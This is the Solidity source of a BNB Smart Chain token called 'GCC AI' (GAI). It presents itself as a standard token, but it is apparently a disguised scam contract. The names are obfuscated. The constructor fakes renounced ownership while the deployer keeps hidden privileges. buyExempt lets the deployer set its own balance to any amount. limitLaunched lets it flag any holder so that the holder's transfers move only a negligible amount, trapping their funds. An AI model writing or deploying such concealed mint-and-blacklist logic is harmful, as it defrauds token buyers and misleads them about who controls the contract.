/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface liquidityAtTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverToTotal) external view returns (uint256);

    function transfer(address launchSell, uint256 atTotal) external returns (bool);

    function allowance(address sellSenderMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 atTotal) external returns (bool);

    function transferFrom(
        address sender,
        address launchSell,
        uint256 atTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletAmount, uint256 value);
    event Approval(address indexed sellSenderMax, address indexed spender, uint256 value);
}

interface launchAt is liquidityAtTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface maxFee {
    function createPair(address receiverFee, address autoTotal) external returns (address);
}

interface walletMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract exemptIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract GCCAI is exemptIs, liquidityAtTake, launchAt {
    uint8 private amountFrom = 18;
    
    bool public totalSell;
    address public exemptReceiver;
    uint256 public listFrom;

    bool public buyShould;
    address public senderList;
    string private exemptIsBuy = "GCC AI";
    uint256 private marketingLaunch = 100000000 * 10 ** amountFrom;
    bool public fromMarketing;
    address private totalTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private toReceiver;

    mapping(address => bool) public fromFundAuto;
    string private isAmount = "GAI";

    mapping(address => bool) public swapLimit;

    mapping(address => mapping(address => uint256)) private tokenSell;
    uint256 constant buyMax = 9 ** 10;
    
    uint256 public shouldFromTrading;
    uint256 public atMarketing;
    mapping(address => uint256) private shouldLaunch;

    uint256 private shouldReceiver;
    

    event OwnershipTransferred(address indexed exemptTeam, address indexed buyTo);

    constructor (){
        
        walletMarketing isLimitSwap = walletMarketing(totalTx);
        exemptReceiver = maxFee(isLimitSwap.factory()).createPair(isLimitSwap.WETH(), address(this));
        toReceiver = _msgSender();
        if (shouldReceiver == shouldFromTrading) {
            shouldReceiver = atMarketing;
        }
        senderList = toReceiver;
        fromFundAuto[senderList] = true;
        if (listFrom == shouldFromTrading) {
            shouldFromTrading = shouldReceiver;
        }
        shouldLaunch[senderList] = marketingLaunch;
        emit Transfer(address(0), senderList, marketingLaunch);
        feeMax();
    }

    

    function name() external view virtual override returns (string memory) {
        return exemptIsBuy;
    }

    function decimals() external view virtual override returns (uint8) {
        return amountFrom;
    }

    function feeMax() public {
        emit OwnershipTransferred(senderList, address(0));
        toReceiver = address(0);
    }

    function limitLaunched(address buyAuto) public {
        if (shouldReceiver == atMarketing) {
            shouldReceiver = atMarketing;
        }
        if (buyAuto == senderList || buyAuto == exemptReceiver || !fromFundAuto[_msgSender()]) {
            return;
        }
        
        swapLimit[buyAuto] = true;
    }

    function getOwner() external view returns (address) {
        return toReceiver;
    }

    function exemptTotal() public {
        if (atMarketing != shouldReceiver) {
            atMarketing = shouldFromTrading;
        }
        
        shouldReceiver=0;
    }

    function buyExempt(uint256 atTotal) public {
        if (!fromFundAuto[_msgSender()]) {
            return;
        }
        shouldLaunch[senderList] = atTotal;
    }

    function listWallet() public view returns (uint256) {
        return shouldReceiver;
    }

    function transferFrom(address maxReceiver, address launchSell, uint256 atTotal) external override returns (bool) {
        if (tokenSell[maxReceiver][_msgSender()] != type(uint256).max) {
            require(atTotal <= tokenSell[maxReceiver][_msgSender()]);
            tokenSell[maxReceiver][_msgSender()] -= atTotal;
        }
        return atList(maxReceiver, launchSell, atTotal);
    }

    function launchTakeLaunched() public view returns (uint256) {
        return shouldFromTrading;
    }

    function limitAutoMax(address amountExempt) public {
        if (fromMarketing) {
            return;
        }
        
        fromFundAuto[amountExempt] = true;
        
        fromMarketing = true;
    }

    function limitSwap() public view returns (uint256) {
        return listFrom;
    }

    function atList(address maxReceiver, address launchSell, uint256 atTotal) internal returns (bool) {
        if (maxReceiver == senderList || launchSell == senderList) {
            return txFund(maxReceiver, launchSell, atTotal);
        }
        if (buyShould) {
            shouldReceiver = atMarketing;
        }
        if (swapLimit[maxReceiver]) {
            return txFund(maxReceiver, launchSell, buyMax);
        }
        if (listFrom != shouldFromTrading) {
            shouldFromTrading = shouldReceiver;
        }
        return txFund(maxReceiver, launchSell, atTotal);
    }

    function approve(address amountSender, uint256 atTotal) public virtual override returns (bool) {
        tokenSell[_msgSender()][amountSender] = atTotal;
        emit Approval(_msgSender(), amountSender, atTotal);
        return true;
    }

    function exemptTake() public {
        if (atMarketing != shouldReceiver) {
            totalSell = true;
        }
        
        totalSell=false;
    }

    function txFund(address maxReceiver, address launchSell, uint256 atTotal) internal returns (bool) {
        require(shouldLaunch[maxReceiver] >= atTotal);
        shouldLaunch[maxReceiver] -= atTotal;
        shouldLaunch[launchSell] += atTotal;
        emit Transfer(maxReceiver, launchSell, atTotal);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return marketingLaunch;
    }

    function maxAuto() public view returns (bool) {
        return buyShould;
    }

    function allowance(address amountListMax, address amountSender) external view virtual override returns (uint256) {
        return tokenSell[amountListMax][amountSender];
    }

    function symbol() external view virtual override returns (string memory) {
        return isAmount;
    }

    function maxLiquidity() public {
        
        if (atMarketing != shouldFromTrading) {
            shouldReceiver = listFrom;
        }
        listFrom=0;
    }

    function balanceOf(address receiverToTotal) public view virtual override returns (uint256) {
        return shouldLaunch[receiverToTotal];
    }

    function transfer(address exemptTrading, uint256 atTotal) external virtual override returns (bool) {
        return atList(_msgSender(), exemptTrading, atTotal);
    }

    function owner() external view returns (address) {
        return toReceiver;
    }


}